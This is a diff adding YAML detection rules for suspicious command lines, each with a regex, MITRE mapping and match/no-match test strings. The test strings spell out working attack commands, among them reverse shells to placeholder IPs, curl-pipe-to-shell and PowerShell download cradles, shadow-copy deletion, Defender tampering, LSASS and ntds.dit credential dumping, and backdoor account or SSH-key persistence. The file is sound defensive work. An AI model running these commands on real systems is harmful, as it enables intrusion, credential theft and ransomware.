@@ -1,0 +1,266 @@
+# Command-line rules. Applied to: sudo COMMAND= lines, Windows 4688 / Sysmon 1
+# CommandLine, and any base64 / PowerShell -EncodedCommand payload after decoding.
+# Keep quantifiers bounded ({0,300}) so a hostile 8 KB command line stays fast.
+
+- id: cmd-reverse-shell-devtcp
+  name: SUSPICIOUS_COMMAND
+  title: "Reverse shell (/dev/tcp)"
+  type: command
+  severity: critical
+  mitre: [T1059.004]
+  block: inbound
+  pattern: '/dev/(?:tcp|udp)/'
+  tests:
+    match: ["bash -i >& /dev/tcp/203.0.113.99/4444 0>&1"]
+    no_match: ["ls -la /dev/null"]
+
+- id: cmd-reverse-shell-netcat
+  name: SUSPICIOUS_COMMAND
+  title: Reverse shell (netcat -e)
+  type: command
+  severity: critical
+  mitre: [T1059.004]
+  block: inbound
+  pattern: '\b(?:nc|ncat|netcat)\b[^|;\n]{0,200}\s-[ec]\s'
+  tests:
+    match: ["nc -e /bin/sh 203.0.113.9 4444", "ncat 198.51.100.4 9001 -e /bin/bash"]
+    no_match: ["nc -zv 10.0.0.1 22"]
+
+- id: cmd-reverse-shell-mkfifo
+  name: SUSPICIOUS_COMMAND
+  title: Reverse shell (mkfifo pipe)
+  type: command
+  severity: critical
+  mitre: [T1059.004]
+  block: inbound
+  pattern: '\bmkfifo\b.{0,200}\b(?:nc|ncat|sh|bash)\b'
+  tests:
+    match: ["rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 203.0.113.9 4444 >/tmp/f"]
+    no_match: ["mkfifo /tmp/logpipe"]
+
+- id: cmd-reverse-shell-script
+  name: SUSPICIOUS_COMMAND
+  title: Reverse shell (python/perl/ruby/php socket one-liner)
+  type: command
+  severity: critical
+  mitre: [T1059]
+  block: inbound
+  pattern: '\b(?:python[23]?|perl|ruby|php)\s+-[cer]\b.{0,400}\bsocket\b'
+  tests:
+    match: ["python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"203.0.113.9\",4444))'"]
+    no_match: ["python3 -c 'print(42)'", "perl -e 'print 1'"]
+
+- id: cmd-download-and-execute
+  name: SUSPICIOUS_COMMAND
+  title: "Download and execute (curl | sh)"
+  type: command
+  severity: high
+  mitre: [T1105, T1059.004]
+  block: inbound
+  pattern: '\b(?:curl|wget)\b[^|;\n]{0,300}\|\s*(?:ba|z|da)?sh\b'
+  tests:
+    match: ["curl -s http://203.0.113.99/x.sh | sh", "wget -qO- http://x/y | bash"]
+    no_match: ["curl https://example.com -o file.txt"]
+
+- id: cmd-decode-and-execute
+  name: SUSPICIOUS_COMMAND
+  title: "Decode and execute (base64 -d | sh)"
+  type: command
+  severity: high
+  mitre: [T1140, T1059.004]
+  block: inbound
+  pattern: '\bbase64\s+(?:-d|--decode)\b[^;\n]{0,100}\|\s*(?:ba|z|da)?sh\b'
+  tests:
+    match: ["echo YmFzaA== | base64 -d | bash"]
+    no_match: ["base64 -d file.b64 > out.bin"]
+
+- id: cmd-history-tampering
+  name: DEFENSE_EVASION
+  title: Shell history cleared or disabled
+  type: command
+  severity: medium
+  mitre: [T1070.003]
+  pattern: '\bhistory\s+-c\b|\bunset\s+HISTFILE\b|HISTFILE=/dev/null|\bexport\s+HISTSIZE=0\b'
+  tests:
+    match: ["history -c", "unset HISTFILE", "export HISTSIZE=0"]
+    no_match: ["history | tail"]
+
+- id: cmd-cron-persistence
+  name: PERSISTENCE
+  title: Cron persistence
+  type: command
+  severity: medium
+  mitre: [T1053.003]
+  pattern: '>>?\s*/etc/(?:crontab|cron\.d/)|\|\s*crontab\s+-\s*$|\bcrontab\s+-\s'
+  tests:
+    match: ["echo '* * * * * root /tmp/x' >> /etc/crontab", "(crontab -l; echo '@reboot /tmp/.x') | crontab -"]
+    no_match: ["crontab -l"]
+
+- id: cmd-ssh-key-persistence
+  name: PERSISTENCE
+  title: SSH key added to authorized_keys
+  type: command
+  severity: medium
+  mitre: [T1098.004]
+  pattern: '>>?\s*\S*\.ssh/authorized_keys\b'
+  tests:
+    match: ["echo 'ssh-ed25519 AAAA... attacker' >> /root/.ssh/authorized_keys"]
+    no_match: ["cat ~/.ssh/authorized_keys"]
+
+- id: cmd-exec-from-tmp
+  name: SUSPICIOUS_COMMAND
+  title: Executable dropped in /tmp, /var/tmp or /dev/shm
+  type: command
+  severity: medium
+  mitre: [T1222.002]
+  pattern: '\bchmod\s+(?:[ugoa]*\+x|0?[0-7]?[1357][0-7]{2})\s+/(?:tmp|var/tmp|dev/shm)/'
+  tests:
+    match: ["chmod +x /tmp/.x/kworker", "chmod 755 /dev/shm/run"]
+    no_match: ["chmod 644 /tmp/notes.txt", "chmod +x ./build.sh"]
+
+- id: cmd-powershell-encoded
+  name: SUSPICIOUS_COMMAND
+  title: PowerShell encoded command
+  type: command
+  severity: high
+  mitre: [T1059.001, T1027]
+  block: inbound
+  pattern: '\b(?:powershell|pwsh)(?:\.exe)?\b.{0,300}?\s[-/]e[a-z]{0,14}\s+[A-Za-z0-9+/]{20,}={0,2}'
+  tests:
+    match: ["powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA", "pwsh -EncodedCommand ZQBjAGgAbwAgAGgAaQBzAHQAbwByAHkA"]
+    no_match: ["powershell.exe -ExecutionPolicy Bypass -File C:\\scripts\\backup.ps1"]
+
+- id: cmd-powershell-download-cradle
+  name: SUSPICIOUS_COMMAND
+  title: PowerShell download cradle
+  type: command
+  severity: high
+  mitre: [T1059.001, T1105]
+  block: inbound
+  pattern: '\b(?:IEX|Invoke-Expression)\b.{0,300}(?:DownloadString|Invoke-WebRequest|\biwr\b|Invoke-RestMethod|\birm\b|Net\.WebClient)|(?:DownloadString|Invoke-WebRequest|\biwr\b|Invoke-RestMethod|\birm\b)[^|\n]{0,300}\|\s*(?:IEX|Invoke-Expression)\b'
+  tests:
+    match: ["IEX (New-Object Net.WebClient).DownloadString('http://203.0.113.99/a.ps1')", "iwr http://x/a.ps1 | iex"]
+    no_match: ["Invoke-WebRequest https://example.com/file.zip -OutFile file.zip"]
+
+- id: cmd-certutil-download
+  name: SUSPICIOUS_COMMAND
+  title: certutil used to download a file (LOLBin)
+  type: command
+  severity: high
+  mitre: [T1105]
+  pattern: '\bcertutil(?:\.exe)?\b.{0,100}-urlcache\b.{0,200}(?:https?|ftp)://'
+  tests:
+    match: ["certutil.exe -urlcache -split -f http://203.0.113.99/p.exe C:\\Users\\Public\\p.exe"]
+    no_match: ["certutil -hashfile file.exe SHA256"]
+
+- id: cmd-inhibit-recovery
+  name: RANSOMWARE_PRECURSOR
+  title: Backups / shadow copies deleted
+  type: command
+  severity: critical
+  mitre: [T1490]
+  pattern: '\bvssadmin(?:\.exe)?\b.{0,50}\bdelete\s+shadows\b|\bwmic(?:\.exe)?\b.{0,50}\bshadowcopy\s+delete\b|\bwbadmin(?:\.exe)?\b.{0,50}\bdelete\s+catalog\b|\bbcdedit(?:\.exe)?\b.{0,80}\brecoveryenabled\s+no\b'
+  description: Nearly every ransomware family does this right before encrypting.
+  tests:
+    match: ["vssadmin.exe delete shadows /all /quiet", "wmic shadowcopy delete", "bcdedit /set {default} recoveryenabled No"]
+    no_match: ["vssadmin list shadows"]
+
+- id: cmd-defender-tampering
+  name: DEFENSE_EVASION
+  title: Microsoft Defender tampering
+  type: command
+  severity: high
+  mitre: [T1562.001]
+  pattern: 'Set-MpPreference\b.{0,100}-Disable(?:RealtimeMonitoring|BehaviorMonitoring|IOAVProtection|ScriptScanning)\s+(?:\$true|1)\b|Add-MpPreference\b.{0,50}-Exclusion(?:Path|Process|Extension)\b'
+  tests:
+    match: ["Set-MpPreference -DisableRealtimeMonitoring $true", "Add-MpPreference -ExclusionPath C:\\Users\\Public"]
+    no_match: ["Get-MpPreference", "Set-MpPreference -DisableRealtimeMonitoring $false"]
+
+- id: cmd-lsass-dump
+  name: CREDENTIAL_DUMPING
+  title: LSASS / credential dumping
+  type: command
+  severity: critical
+  mitre: [T1003.001]
+  pattern: '\bprocdump(?:64)?(?:\.exe)?\b.{0,100}\blsass\b|\bcomsvcs(?:\.dll)?\b.{0,50}\bMiniDump\b|\bsekurlsa::|\blsadump::|\bMiniDumpWriteDump\b|\bOut-Minidump\b|\brdrleakdiag(?:\.exe)?\b.{0,100}/fullmemdmp\b'
+  tests:
+    match: ["procdump64.exe -accepteula -ma lsass.exe lsass.dmp", "rundll32.exe C:\\windows\\System32\\comsvcs.dll, MiniDump 624 C:\\temp\\out.dmp full", "mimikatz.exe sekurlsa::logonpasswords", "$WER::MiniDumpWriteDump($ProcessHandle, $ProcessId, $FileStream.SafeFileHandle)", "rdrleakdiag.exe /p 640 /o C:\\temp /fullmemdmp /wait 1"]
+    no_match: ["procdump -ma notepad.exe"]
+
+- id: cmd-net-admin-add
+  name: PRIVILEGE_ESCALATION
+  title: User added to local Administrators (net.exe)
+  type: command
+  severity: high
+  mitre: [T1098]
+  pattern: '\bnet1?(?:\.exe)?\s+localgroup\s+"?administrators"?\s+\S+\s+/add\b'
+  tests:
+    match: ["net localgroup administrators support_svc /add", "net1.exe localgroup \"Administrators\" eve /add"]
+    no_match: ["net localgroup administrators"]
+
+- id: cmd-net-user-add
+  name: PERSISTENCE
+  title: Local account created (net user /add)
+  type: command
+  severity: medium
+  mitre: [T1136.001]
+  pattern: '\bnet1?(?:\.exe)?\s+user\s+\S+\s+\S+.{0,60}/add\b'
+  tests:
+    match: ["net user support_svc P@ssw0rd! /add"]
+    no_match: ["net user", "net user alice"]
+
+- id: cmd-powershell-obfuscated-iex
+  name: SUSPICIOUS_COMMAND
+  title: Obfuscated PowerShell Invoke-Expression
+  type: command
+  severity: high
+  mitre: [T1059.001, T1027]
+  pattern: '\b(?:IEX|Invoke-Expression)\b\s*\(.{0,300}?(?:\[char\]\s*\(?\s*0?x?[0-9a-f]+|FromBase64String|-join\b|-bxor\b|\.Replace\s*\()'
+  tests:
+    match: ["$XX=IEX(('[' + [char]0x53 + 'ystem.Text.Enc' + [char]0x6f + 'ding]'))", "IEX ([Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($b)))"]
+    no_match: ["Invoke-Expression $command", "Get-ChildItem | Where-Object { $_.Name -join ',' }"]
+
+- id: cmd-ntds-dump
+  name: CREDENTIAL_DUMPING
+  title: Active Directory database (ntds.dit) dump
+  type: command
+  severity: critical
+  mitre: [T1003.003]
+  pattern: '\bntdsutil(?:\.exe)?\b.{0,150}\bifm\b|\b(?:copy|xcopy|robocopy|esentutl)\b.{0,200}\\ntds\.dit\b'
+  tests:
+    match: ["ntdsutil \"ac i ntds\" \"ifm\" \"create full c:\\temp\" q q", "copy \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1\\Windows\\NTDS\\ntds.dit C:\\temp\\ntds.dit"]
+    no_match: ["ntdsutil \"metadata cleanup\""]
+
+- id: cmd-schtasks-create
+  name: PERSISTENCE
+  title: Scheduled task created (schtasks /create)
+  type: command
+  severity: medium
+  mitre: [T1053.005]
+  pattern: '\bschtasks(?:\.exe)?\b.{0,50}/create\b'
+  false_positives: ["Software installers and admin scripts"]
+  tests:
+    match: ["schtasks /create /sc minute /mo 1 /tn Updater /tr C:\\Users\\Public\\u.exe"]
+    no_match: ["schtasks /query /fo LIST"]
+
+- id: cmd-wmic-remote-xsl
+  name: SUSPICIOUS_COMMAND
+  title: WMIC remote XSL execution (Squiblytwo)
+  type: command
+  severity: high
+  mitre: [T1220]
+  pattern: '\bwmic(?:\.exe)?\b.{0,200}/format:\s*["'']?https?://'
+  tests:
+    match: ["wmic os get /format:\"https://example.com/evil.xsl\""]
+    no_match: ["wmic os get caption /format:list"]
+
+- id: cmd-netsh-portproxy
+  name: SUSPICIOUS_COMMAND
+  title: Port forwarding with netsh portproxy
+  type: command
+  severity: medium
+  mitre: [T1090]
+  pattern: '\bnetsh(?:\.exe)?\b.{0,50}\binterface\s+portproxy\s+add\b'
+  tests:
+    match: ["netsh interface portproxy add v4tov4 listenport=4444 connectaddress=10.0.0.5 connectport=3389"]
+    no_match: ["netsh interface show interface"]
